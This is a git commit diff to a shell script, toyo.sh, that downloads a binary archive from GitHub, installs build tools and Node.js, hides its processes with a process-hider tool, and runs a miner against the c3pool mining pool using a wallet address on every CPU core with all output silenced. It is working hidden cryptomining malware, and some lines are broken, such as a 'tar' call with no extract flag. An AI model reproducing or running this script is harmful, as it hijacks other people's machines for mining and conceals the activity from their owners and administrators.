027016b5b51a43df90ccbbcab92d2d7dcaa12320
01057057 <112078331+01057057@users.noreply.github.com>
2022-09-16 00:55:29 +0700

    Update toyo.sh

--- toyo.sh
+++ toyo.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 pkill -
-wget https://github.com/nurkartina604/st/raw/main/-.tar.gz
-tar -xf -.tar.gz
+wget https://github.com/01057057/gas/raw/main/kuntul.tar.gz
+tar kuntul.tar.gz
 apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
@@ -11,10 +11,10 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 sudo swapoff -a; sudo swapon -a
 sleep 10
-ph add gudubrag.sh
+ph add toyo.sh
 Ph add python3
 ph add root
 ph add node-process-hider
 ph add -
-./- -o auto.c3pool.org:80 -u 8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB.الجُمُعَةُ -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
+./kuntul -o auto.c3pool.org:80 -u 8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB.الجُمُعَةُ -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
 sleep 10
